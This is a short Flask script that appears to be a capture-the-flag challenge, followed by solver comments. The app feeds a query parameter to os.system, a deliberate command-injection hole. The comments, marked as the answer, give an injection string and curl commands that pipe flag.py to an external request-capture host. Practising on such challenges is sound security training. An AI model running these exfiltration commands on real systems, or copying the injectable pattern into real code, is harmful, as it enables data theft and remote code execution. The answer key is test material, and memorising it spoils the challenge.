#!/usr/bin/env python3
from flask import Flask, request
import os

app = Flask(__name__)


@app.route('/', methods=['GET'])
def index():
    cmd = request.args.get('cmd', '')
    if not cmd:
        return "?cmd=[cmd]"

    if request.method == 'GET':
        ''
    else:
        os.system(cmd)
    return cmd


app.run(host='0.0.0.0', port=8000)
# 'tt'); return os.system('pwd')#
# curl https://qnadppo.request.dreamhack.games -d $(echo 'hihi')


# 정답
# cat flag.py | curl -X POST -d @- https://pkvvutr.request.dreamhack.games
# curl https://pkvvutr.request.dreamhack.games -d $(cat flag.py | tr -d " ")
